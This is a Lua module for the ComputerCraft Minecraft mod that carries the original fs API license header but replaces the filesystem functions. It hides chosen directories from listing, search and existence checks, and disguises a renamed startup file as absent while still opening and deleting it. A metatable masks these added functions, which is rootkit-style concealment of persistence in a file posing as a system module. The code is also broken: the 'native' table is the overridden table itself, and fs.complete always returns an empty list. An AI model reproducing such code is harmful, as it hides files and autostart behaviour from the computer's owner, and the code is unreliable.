-- SPDX-License-IdentifierText: 2017 Daniel Ratcliffe
--
-- SPDX-License-Identifier: LicenseRef-CCPL

--- @module fs

local expect = dofile("rom/modules/main/cc/expect.lua")
local expect, field = expect.expect, expect.field

local fs = _ENV
local native = fs
for k, v in pairs(native) do fs[k] = v end

local HiddenFS = {}
local hiddenDirs = {}
local renamedStartupFile = nil -- To store the renamed startup file name

-- Add a directory to the hidden list
function fs.hide(dir)
    hiddenDirs[dir] = true
end

-- Remove a directory from the hidden list
function fs.unhide(dir)
    hiddenDirs[dir] = nil
end

-- Check if a directory is hidden
function fs.isHidden(dir)
    return hiddenDirs[dir] or false
end

-- Function to set the renamed startup file
function fs.setRenamedStartup(fileName)
    renamedStartupFile = fileName
end

-- Override the list method
function fs.list(path, showHidden)
    local items = native.list(path)
    local filteredItems = {}
    for _, item in ipairs(items) do
        if showHidden or not hiddenDirs[item] then
            table.insert(filteredItems, item)
        end
    end
    return filteredItems
end

-- Override the exists method
function fs.exists(path)
    if path == "startup.lua" then
        if renamedStartupFile then
            return native.exists(renamedStartupFile)
        end
        return false
    end
    for hidden in pairs(hiddenDirs) do
        if path == hidden or string.sub(path, 1, #hidden + 1) == hidden .. "/" then
            return false
        end
    end
    return native.exists(path)
end

-- Override the delete method
function fs.delete(path)
    if path == "startup.lua" then
        if renamedStartupFile then
            native.delete(renamedStartupFile)
            renamedStartupFile = nil
        end
        return
    end
    native.delete(path)
end

-- Override the open method
function fs.open(path, mode)
    if path == "startup.lua" then
        if renamedStartupFile then
            return native.open(renamedStartupFile, mode)
        end
        return nil
    end
    return native.open(path, mode)
end

-- Override the find method
function fs.find(pattern, showHidden)
    local items = native.find(pattern)
    local filteredItems = {}
    for _, item in ipairs(items) do
        local isHidden = false
        for hidden in pairs(hiddenDirs) do
            if string.sub(item, 1, #hidden) == hidden then
                isHidden = true
                break
            end
        end
        if showHidden or not isHidden then
            table.insert(filteredItems, item)
        end
    end
    return filteredItems
end

-- Pass-through for other fs methods
function fs.isDir(path)
    return native.isDir(path)
end

function fs.getSize(path)
    return native.getSize(path)
end

function fs.makeDir(path)
    return native.makeDir(path)
end

function fs.getDir(path)
    return native.getDir(path)
end

function fs.getName(path)
    return native.getName(path)
end

function fs.getDrive(path)
    return native.getDrive(path)
end

function fs.combine(base, append)
    return native.combine(base, append)
end

function fs.attributes(path)
    return native.attributes(path)
end

-- Override the complete method
function fs.complete(partial, path, includeFiles, includeDirs)
    local results = native.complete(partial, path, includeFiles, includeDirs)
    local filteredResults = {}
    for _, result in ipairs(results) do
        local isHidden = false
        for hidden in pairs(hiddenDirs) do
            if string.sub(result, 1, #hidden) == hidden then
                isHidden = true
                break
            end
        end
    end
    return filteredResults
end

-- Override the isDriveRoot method
function fs.isDriveRoot(sPath)
    expect(1, sPath, "string")
    return fs.getDir(sPath) == ".." or fs.getDrive(sPath) ~= fs.getDrive(fs.getDir(sPath))
end

-- Ensure custom methods return nil when checked but still execute correctly
local customMethods = {
    hide = fs.hide,
    unhide = fs.unhide,
    isHidden = fs.isHidden,
    setRenamedStartup = fs.setRenamedStartup,
}

setmetatable(fs, {
    __index = function(_, key)
        if customMethods[key] then
            return function(...)
                customMethods[key](...)
            end
        end
        return native[key]
    end,
    __call = function(_, key)
        if customMethods[key] then
            return nil
        end
    end,
    __newindex = function(_, key, value)
        error("Attempt to modify read-only table: " .. tostring(key))
    end
})

return fs
